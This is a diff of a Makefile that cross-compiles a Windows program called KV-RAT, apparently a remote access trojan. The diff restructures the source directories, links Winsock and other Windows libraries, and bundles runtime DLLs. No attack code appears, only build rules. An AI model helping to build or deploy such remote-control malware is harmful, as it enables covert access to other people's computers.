@@ -1,36 +1,42 @@
 CC = x86_64-w64-mingw32-g++
-CFLAGS = -Wall
+CFLAGS = -Wall -I/usr/x86_64-w64-mingw32/include/
+LFLAGS = -lws2_32 -lole32 -lgdi32 -luuid -static-libgcc -static-libstdc++ -lshlwapi
 
-# Source Files and Object Files
-# External files are like this
-#	external/imgui/imgui.cpp \
-    external/imgui/imgui_demo.cpp \
-    external/imgui/imgui_draw.cpp \
-    external/imgui/imgui_impl_dx9.cpp \
-    external/imgui/imgui_impl_win32.cpp \
-    external/imgui/imgui_tables.cpp \
-    external/imgui/imgui_widgets.cpp \
 
-SRC = src/Commands/CommandHandler.cpp \
-      src/Commands/commands.cpp \
-      src/KV-RAT.cpp \
-      src/networking.cpp \
-      src/onload.cpp \
-      src/Utils/utils.cpp
+# Directories
+SRC_DIR = src
+BUILD_DIR = build
+UTIL_DIR = $(SRC_DIR)/Utils
+CMD_DIR = $(SRC_DIR)/Commands
 
-OBJ = $(SRC:.cpp=.o)
+# Source files
+SRCS = $(SRC_DIR)/main.cpp $(SRC_DIR)/networking.cpp $(UTIL_DIR)/Utils.cpp $(CMD_DIR)/Commands.cpp $(CMD_DIR)/CommandHandler.cpp $(SRC_DIR)/onload.cpp
+OBJS = $(addprefix $(BUILD_DIR)/, $(notdir $(SRCS:.cpp=.o)))
 
-# Executable Name
-EXEC = KV-RAT.exe
+.PHONY: directories clean all post-build
 
-# Targets
-all: $(EXEC)
+all: directories KV-RAT post-build
 
-$(EXEC): $(OBJ)
-	$(CC) $(CFLAGS) -o $@ $^
+directories:
+	mkdir -p $(BUILD_DIR)
 
-%.o: %.cpp
+KV-RAT: $(OBJS)
+	$(CC) $(CFLAGS) -o $(BUILD_DIR)/KV-RAT.exe $^ $(LFLAGS)
+
+$(BUILD_DIR)/%.o: $(SRC_DIR)/%.cpp
 	$(CC) $(CFLAGS) -c $< -o $@
 
-clean:
-	rm -f $(OBJ) $(EXEC)
+$(BUILD_DIR)/%.o: $(UTIL_DIR)/%.cpp
+	$(CC) $(CFLAGS) -c $< -o $@
+
+$(BUILD_DIR)/%.o: $(CMD_DIR)/%.cpp
+	$(CC) $(CFLAGS) -c $< -o $@
+
+post-build: 
+	cp /usr/x86_64-w64-mingw32/bin/libgcc_s_seh-1.dll $(BUILD_DIR)
+	cp /usr/x86_64-w64-mingw32/bin/libstdc++-6.dll $(BUILD_DIR)
+	cp /usr/x86_64-w64-mingw32/bin/libwinpthread-1.dll $(BUILD_DIR)  # Make sure this line starts with a tab, not spaces
+
+
+clean:  
+	rm -rf $(BUILD_DIR)/*.o $(BUILD_DIR)/KV-RAT.exe
